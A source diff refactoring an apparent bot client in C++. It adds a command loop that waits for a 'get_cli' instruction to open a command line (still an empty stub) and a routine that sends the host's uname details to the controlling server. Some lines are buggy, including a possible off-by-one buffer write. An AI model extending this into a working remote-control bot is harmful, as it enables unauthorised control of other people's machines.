@@ -1,74 +1,47 @@
-#include <assert.h>
-#include <arpa/inet.h>
-#include <errno.h>
 #include <netinet/in.h>
 #include <stdio.h>
-#include <stdlib.h>
 #include <string.h>
 
-#include <sys/types.h>
-#include <sys/socket.h>
-
+#include <sys/utsname.h>
 
 #include "commands.h"
+#include "log.h"
 #include "messages.h"
 #include "tcp_client.hpp"
-#include "log.h"
+#include "sock.hpp"
+
+#define BUF_SZ 1024
 
 BOT::BOT()
 {
 	DEBUG(LOG_VERBOSE, "bot initialisation\n");
 
-	this->sock = 0;
-	this->serv_port = 
-	    this->client_ip = this->client_port = 0;
-	
-	//some default values
-	this->sock_domain = AF_INET;
-	this->sock_type = SOCK_STREAM;
-	this->serv_port = 0;
-	this->serv_ip = 0;
+	this->socket = new Socket();
 }
 
 bool BOT::set_ip(char *serv_ip)
 {
 	DEBUG(LOG_VERBOSE, "bot set IP\n");
 
-	this->serv_ip = inet_addr(serv_ip);
-	
-	if (this->serv_ip == INADDR_NONE)
-		return false;
-	
-	return true;
+	return this->socket->set_ip(serv_ip);
 }
 
 bool BOT::set_port(char *serv_port)
 {
 	DEBUG(LOG_VERBOSE, "bot set port\n");
-	uint16_t port;
-//FIXME:
-	port = atoi(serv_port);
-
-	this->serv_port = htons(port);
 	
-	return true;
+	return this->socket->set_port(serv_port);
 }
 
 bool BOT::init_connection()
 {
 	DEBUG(LOG_VERBOSE, "bot init connection\n");
 	
-	assert(this->serv_ip != 0 
-	    && this->serv_port != 0);
-
-	if (this->sock != 0)
-		return false;
-	
-	if (this->create_socket() == false)
+	if (this->socket->create_socket() == false)
 		return false;
 
-	if (this->connect_socket() == false) {
-		this->close_socket();
+	if (this->socket->connect_socket() == false) {
+		this->socket->close_socket();
 		return false;
 	}
 
@@ -79,6 +52,7 @@ bool BOT::init_connection()
 bool BOT::main_loop()
 {
 	int cmd;
+	struct command_ctx ctx;
 
 	if (this->hand_shake() == false)
 		return false;
@@ -88,119 +62,95 @@ bool BOT::main_loop()
 	
 	cmd = CMD_BYE;
 	do {
-
+		cmd = this->get_next_cmd(&ctx);
+		switch (cmd) {
+		case CMD_GET_CLI:
+			this->get_cli_mode();
+			break;
+		default:
+			break;
+		}
 	} while (cmd != CMD_BYE);
 
 
 	return true;
 }
 
-bool BOT::send_client_info()
+int BOT::get_next_cmd(struct command_ctx *ctx)
 {
+	int len;
+	char buff[BUF_SZ];
+
+	if (this->socket->recv_msg(buff, &len, BUF_SZ) == false)
+		return CMD_ERR;
+	
+	buff[len] = '\0';
+	DEBUG(LOG_VERBOSE, "recived msg = %s\n", buff);
+
+	if (strcmp(buff, "get_cli\n") == 0)
+		return CMD_GET_CLI;
+	
+	return CMD_BYE;
+}
+
+bool BOT::get_cli_mode()
+{
+	DEBUG(LOG_DEFAULT, "try to get command line interface\n");
+
+	
 	return true;
 }
 
-bool BOT::connect_socket()
+bool BOT::send_client_info()
 {
-	struct sockaddr_in addr;
-	int ret;
+	struct utsname buf;
+	bool ret;
 
-	addr.sin_family = this->sock_domain;
-	addr.sin_port = this->serv_port;
-	addr.sin_addr.s_addr = this->serv_ip;
+	if (uname(&buf) != 0)
+		return false;
+	ret = this->socket->send_msg((char *)&buf, sizeof(buf));
 
-	ret = connect(this->sock, (const sockaddr *)&addr, sizeof(addr));
-
-	if (ret == -1) {
-		DEBUG(LOG_DEFAULT, "can't connect to server: %s\n", strerror(errno));
+	if (ret == false) {
+		DEBUG(LOG_DEFAULT, "can't set client information\n");
 		return false;
 	}
-	DEBUG(LOG_VERBOSE, "bot connection success\n");
 
 	return true;
 }
 
 bool BOT::hand_shake()
 {
-	assert(this->sock != 0);
 	char buff[128];
 	int len;
 	bool ret;
 
-	ret = this->send_msg(HELLO_MSG, HELLO_MSG_LEN);
+	ret = this->socket->send_msg(HELLO_MSG, strlen(HELLO_MSG));
 	if (ret == false) {
 		DEBUG(LOG_DEFAULT, "send_msg handshake fail\n");
 		return false;
 	}
 
-	ret = this->recv_msg(buff, *len, sizeof(buff));
+	ret = this->socket->recv_msg(buff, &len, sizeof(buff));
 	
 	if (ret == false) {
 		DEBUG(LOG_DEFAULT, "send_msg handshake fail\n");
 		return false;
 	}
-
-	return true;
-}
-
-bool BOT::send_msg(char *msg, int len)
-{
-	assert(this->sock != 0);
-	int ret, sended;
-
-	sended = 0;
-
-	do {
-		ret = send(this->sock, msg, len, 0);
-		if (ret == -1)
-			goto err;
-		msg += ret;
-	} while ((sended += ret) < len);
-
-	return true;
-err:
-	return false;
-}
-
-bool BOT::recv_msg(char *msg, int *len, int maxlen)
-{
-	assert(this->sock != 0);
-	int ret;
-
-//FIXME:
-	ret = recv(this->sock, msg, maxlen, 0);
-	if (ret == -1)
-		goto err;
-
-	*len = ret;
 	
-	return true;
-err:
-	return false;
-}
-
-bool BOT::create_socket()
-{
-	int sock;
-
-	sock = socket(this->sock_domain, this->sock_type, 0);
-	
-	if (sock == -1) {
-		DEBUG(LOG_DEFAULT, "can't create socket\n");
+	if (this->validate_server(buff, ret) == false) {
+		DEBUG(LOG_DEFAULT, "Host validation fail\n");
 		return false;
 	}
-	this->sock = sock;
+
+	DEBUG(LOG_DEFAULT, "hand shake success\n");
 
 	return true;
 }
 
-bool BOT::close_socket()
+bool BOT::validate_server(char *msg, int sz)
 {
-	assert(this->sock != 0);
-
-	shutdown(this->sock, SHUT_RDWR);
-
-	this->sock = 0;
+	if (strncmp(HELLO_ACK, msg, sz) != 0)
+		return false;
 
 	return true;
 }
@@ -209,7 +159,7 @@ bool BOT::close_connection()
 {
 	DEBUG(LOG_VERBOSE, "bot close connection\n");
 
-	return this->close_socket();
+	return this->socket->close_socket();
 }
 
 
